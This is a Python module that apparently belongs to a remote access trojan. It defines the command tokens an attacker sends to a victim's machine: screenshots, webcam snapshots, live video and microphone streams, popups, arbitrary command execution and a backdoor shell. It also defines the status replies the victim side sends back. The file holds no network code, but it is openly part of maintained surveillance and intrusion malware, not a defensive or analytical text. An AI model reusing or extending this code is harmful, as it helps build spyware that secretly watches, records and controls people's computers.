"""Protocol tokens used for attacker/victim communication.

Prefer the CMD_* constants (stable, snake_case, machine-friendly).
Legacy tokens are kept so existing tooling doesn't break.
"""

from enum import Enum


class Message(str, Enum):
    # ---- Encoding ----
    TEXT_ENCODING = "utf-8"

    # ---- Attacker -> Victim commands ----
    CMD_SHOW_HEADER = "show_header"
    CMD_LIST_CLIENTS = "list_clients"
    CMD_ECHO = "echo"
    CMD_EXIT = "exit"
    CMD_PUBLIC_IP = "public_ip"
    CMD_SEND_TO_CLIENT = "send_to_client"

    CMD_CAPTURE_SCREENSHOT = "capture_screenshot"
    CMD_CAPTURE_SCREENSHOT_SHORT = "ss"

    CMD_CAPTURE_SNAPSHOT = "capture_snapshot"
    CMD_CAPTURE_SNAPSHOT_SHORT = "snap"

    CMD_START_VIDEO_STREAM = "start_video_stream"
    CMD_START_VIDEO_STREAM_SHORT = "vs"

    CMD_START_AUDIO_STREAM = "start_audio_stream"
    CMD_START_AUDIO_STREAM_SHORT = "as"

    CMD_CAPTURE_WEBCAM_SNAPSHOT = "capture_webcam_snapshot"
    CMD_SHOW_POPUP = "show_popup"
    CMD_EXECUTE = "execute"

    # Backdoor shell session
    CMD_SHELL = "shell"

    # ---- Victim -> Attacker status ----
    STATUS_SCREENSHOT_CAPTURED = "OK:SCREENSHOT_CAPTURED"
    STATUS_SNAPSHOT_CAPTURED = "OK:SNAPSHOT_CAPTURED"
    STATUS_VIDEO_STREAM_STARTING = "OK:VIDEO_STREAM_STARTING"
    STATUS_AUDIO_STREAM_STARTING = "OK:AUDIO_STREAM_STARTING"
    STATUS_SHELL_READY = "OK:SHELL_READY"
    ERROR_COMMAND_FAILED = "ERROR:COMMAND_FAILED"

    # ---- Legacy tokens (accepted for backward compat) ----
    LEGACY_SHOW_CLIENTS = "show_clients"
    LEGACY_QUIT = "quit"
    LEGACY_IP = "ip"
    LEGACY_SEND_AT = "send_at"

    LEGACY_TAKE_SCREENSHOT = "take screenshot"
    LEGACY_TAKE_SCREENSHOT_SHORT = "tss"
    LEGACY_TAKE_SNAPSHOT = "take snapshot"
    LEGACY_START_WEBCAM = "webcam feed"
    LEGACY_START_WEBCAM_SHORT = "wf"
    LEGACY_START_MICROPHONE = "mic feed"
    LEGACY_START_MICROPHONE_SHORT = "mf"
    LEGACY_POPUP = "popup"

    # ---- Backward-compatible aliases ----
    ERROR_MSG = ERROR_COMMAND_FAILED
    TAKEN_SCREENSHOT = STATUS_SCREENSHOT_CAPTURED
    TAKEN_SNAPSHOT = STATUS_SNAPSHOT_CAPTURED
    STARTING_LIVESTREAM = STATUS_VIDEO_STREAM_STARTING
    STARTING_AUDIOSTREAM = STATUS_AUDIO_STREAM_STARTING
